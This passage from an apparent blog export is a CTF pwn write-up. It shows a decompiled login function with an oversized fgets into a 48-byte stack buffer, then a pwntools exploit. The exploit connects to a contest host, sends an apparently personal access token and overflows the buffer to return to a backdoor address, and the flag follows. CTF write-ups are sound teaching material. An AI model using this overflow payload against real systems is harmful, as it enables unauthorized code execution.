data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyNC9wZGYvMzUzNTE0ODEvMTcxNTA4MjI5NzAzNC0zNWYzMDZjZC01MGIxLTQ1NWYtYjZjMS1jYjdjZmM2ZmMxMjEucGRmP19sYWtlX2NhcmQ9JTdCJTIyc3JjJTIyJTNBJTIyaHR0cHMlM0ElMkYlMkZ3d3cueXVxdWUuY29tJTJGYXR0YWNobWVudHMlMkZ5dXF1ZSUyRjAlMkYyMDI0JTJGcGRmJTJGMzUzNTE0ODElMkYxNzE1MDgyMjk3MDM0LTM1ZjMwNmNkLTUwYjEtNDU1Zi1iNmMxLWNiN2NmYzZmYzEyMS5wZGYlMjIlMkMlMjJuYW1lJTIyJTNBJTIyYXR0LnBkZiUyMiUyQyUyMnNpemUlMjIlM0ExNjcwNCUyQyUyMmV4dCUyMiUzQSUyMnBkZiUyMiUyQyUyMnNvdXJjZSUyMiUzQSUyMiUyMiUyQyUyMnN0YXR1cyUyMiUzQSUyMmRvbmUlMjIlMkMlMjJkb3dubG9hZCUyMiUzQXRydWUlMkMlMjJ0YXNrSWQlMjIlM0ElMjJ1ZjRiNWYzZjItNmFlZS00NWM1LTlkNmQtYzkwYTY2MDMyNWYlMjIlMkMlMjJ0YXNrVHlwZSUyMiUzQSUyMnVwbG9hZCUyMiUyQyUyMnR5cGUlMjIlM0ElMjJhcHBsaWNhdGlvbiUyRnBkZiUyMiUyQyUyMl9fc3BhY2luZyUyMiUzQSUyMmJvdGglMjIlMkMlMjJtb2RlJTIyJTNBJTIydGl0bGUlMjIlMkMlMjJpZCUyMiUzQSUyMnUwNTU2MTEzZiUyMiUyQyUyMm1hcmdpbiUyMiUzQSU3QiUyMnRvcCUyMiUzQXRydWUlMkMlMjJib3R0b20lMjIlM0F0cnVlJTdEJTJDJTIyY2FyZCUyMiUzQSUyMmZpbGUlMjIlN0Q=\">att.pdf</span>(zip)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">login</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s1[<span class=\"number\">48</span>]; <span class=\"comment\">// [rsp+0h] [rbp-90h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">95</span>]; <span class=\"comment\">// [rsp+30h] [rbp-60h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int8 v3; <span class=\"comment\">// [rsp+8Fh] [rbp-1h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"number\">0x50</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(s1, <span class=\"number\">0</span>, <span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Username: &quot;</span>);</span><br><span class=\"line\">  fgets(s, <span class=\"number\">80</span>, <span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( s[<span class=\"number\">0x14</span>] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Username too long&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Password: &quot;</span>);</span><br><span class=\"line\">    fgets(s1, <span class=\"number\">0x320</span>, <span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(s, <span class=\"string\">&quot;admin\\n&quot;</span>) &amp;&amp; !<span class=\"built_in\">strcmp</span>(s1, <span class=\"string\">&quot;1q2w3e4r\\n&quot;</span>) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Login successful, welcome admin&quot;</span>);</span><br><span class=\"line\">      v3 = <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Login failed&quot;</span>);</span><br><span class=\"line\">      v3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( s1[<span class=\"number\">0x28</span>] )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Stack smashing detected&quot;</span>);</span><br><span class=\"line\">      overflow_detected = <span class=\"number\">1</span>;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> v3;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>溢出，返回到后门函数<br>\n exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;prob04.contest.pku.edu.cn&quot;</span>, <span class=\"number\">10004</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;token: &quot;</span>, <span class=\"string\">b&#x27;502:MEUCIQCSKqRJcp-PqKLApv7lBRVleK1e5RKveCEC5QmjJ0OONQIgRVfKZtoZoiGXf4sDyUDuFG0Uf0DLCPGdYFAkCEYMvw4=&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;1q2w3e4r&#x27;</span></span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x98</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>) + p64(<span class=\"number\">0x40127e</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;Username&#x27;</span>, <span class=\"string\">&quot;admin\\x00&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;Password&quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># flag&#123;loGiN_SuccESs_cOnGratUlatION&#125;</span></span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Game"
            ]
        }
    ]
}